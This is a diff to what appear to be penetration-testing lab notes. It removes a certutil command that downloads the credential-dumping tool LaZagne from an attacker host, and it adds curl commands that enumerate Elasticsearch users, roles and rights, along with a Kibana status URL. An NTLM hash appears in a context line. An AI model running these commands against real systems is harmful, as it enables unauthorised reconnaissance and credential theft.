@@ -19,7 +19,25 @@ aad3b435b51404eeaad3b435b51404ee:2a00a0a55d5a916e79c91ad30e770715
 ```
 
 ```
-certutil -urlcache -split -f http://192.168.49.123:80/LaZagne.exe LaZagne.exe
+curl -skD- -o /dev/null https://192.168.123.110:9200/
+```
+
+#List all roles on the system:
+curl -X GET "ELASTICSEARCH-SERVER:9200/_security/role"
+
+#List all users on the system:
+curl -X GET "ELASTICSEARCH-SERVER:9200/_security/user"
+
+#Get more information about the rights of an user:
+curl -X GET "ELASTICSEARCH-SERVER:9200/_security/user/USERNAME"
+
+```
+curl -X GET "192.168.123.110:9200/_security/user"
+```
+
+
+```
+http://192.168.123.110:5601/status
 ```
 
 ```
